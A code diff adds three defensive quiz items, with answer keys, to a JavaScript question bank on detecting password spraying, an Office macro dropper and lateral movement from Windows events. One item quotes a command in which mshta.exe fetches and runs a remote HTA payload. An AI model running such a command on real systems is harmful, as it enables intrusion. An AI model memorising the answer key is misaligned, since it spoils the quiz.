@@ -1606,5 +1606,41 @@ window.QUIZ_BANK = [
     "correct": 0,
     "explanation": "Event 4720 means a user account was created and 4732 means a member was added to a security-enabled local group, here Administrators. A new admin-level account created late at night without a change request is a typical persistence move, so find the creator in the event details, disable the account and check its logons and actions. Windows Server Backup doesn't create accounts, password spraying shows up as failed logons such as 4625 or 4771, and neither event is about archiving.",
     "difficulty": "Medium"
+  },
+  {
+    "question": "In ten minutes a domain controller logs event 4771 with failure code 0x18 for 300 different user accounts, one or two attempts each, all from the same workstation IP. What is the most likely activity?",
+    "options": [
+      "A normal password change day, when the domain policy forces every user to type a new password at the next sign-in",
+      "Clock drift on the workstation, which makes Kerberos reject every ticket until time is synced again with the domain",
+      "Password spraying over Kerberos: a few common passwords tried against many accounts to avoid lockout thresholds",
+      "A broken mapped drive on the workstation, which retries the same saved password in a loop for every user on the PC"
+    ],
+    "correct": 2,
+    "explanation": "Event 4771 is a failed Kerberos pre-authentication, and code 0x18 means a wrong password. Many accounts with only one or two tries each from a single source is the pattern of password spraying, which stays under the lockout limit. Clock skew shows as code 0x25, a password change day doesn't come from one IP, and a stuck mapped drive repeats one account, not hundreds.",
+    "difficulty": "Medium"
+  },
+  {
+    "question": "EDR shows WINWORD.EXE starting 'mshta.exe http://203.0.113.50/inv.hta' on a user's laptop, followed by a PowerShell process with an encoded command. What is the best reading and first response?",
+    "options": [
+      "Word is downloading a template update through mshta, which is normal; allow it and add the IP address to the proxy allowlist",
+      "A macro used the mshta LOLBin to run a remote HTA payload; isolate the laptop and block the IP and that Office child process",
+      "The user opened a help file in Word, and mshta is the HTML help viewer; ask the user to close Word and run the file again",
+      "PowerShell after mshta is Windows checking the file's signature, so just wait for Defender to finish its scan of the HTA"
+    ],
+    "correct": 1,
+    "explanation": "mshta.exe runs HTML Applications with full script rights, and a remote HTA started by Word followed by encoded PowerShell is a classic macro dropper chain. Isolate the host, block the address, and turn on the ASR rule that blocks Office apps from creating child processes. Word templates don't come through mshta, the help viewer is hh.exe, and signature checks don't launch PowerShell.",
+    "difficulty": "Hard"
+  },
+  {
+    "question": "On a file server, event 4648 shows that HR user 'mrosa' ran a process using the explicit credentials of 'adm-backup', a Domain Admin, and then connected to C$ on ten servers within minutes. What should the analyst conclude?",
+    "options": [
+      "Event 4648 appears on every normal logon, so a regular user borrowing an admin name is expected and needs no follow-up",
+      "The backup service is running under the HR user by design, because backups always start from the busiest user account",
+      "Windows switched the user to the admin account automatically after a UAC prompt, which then opened the shares on its own",
+      "An HR session should never hold Domain Admin credentials; treat it as possible credential theft and lateral movement"
+    ],
+    "correct": 3,
+    "explanation": "Event 4648 logs a logon attempted with explicit credentials, as with runas or 'net use /user'. An HR user wielding a Domain Admin account and touching admin shares across many servers points to stolen credentials being used for lateral movement. Disable or reset 'adm-backup', scope the hosts it reached, and check the HR laptop. 4648 is not written on every logon, backup services don't run under user sessions, and UAC never swaps you into another account.",
+    "difficulty": "Medium"
   }
 ];
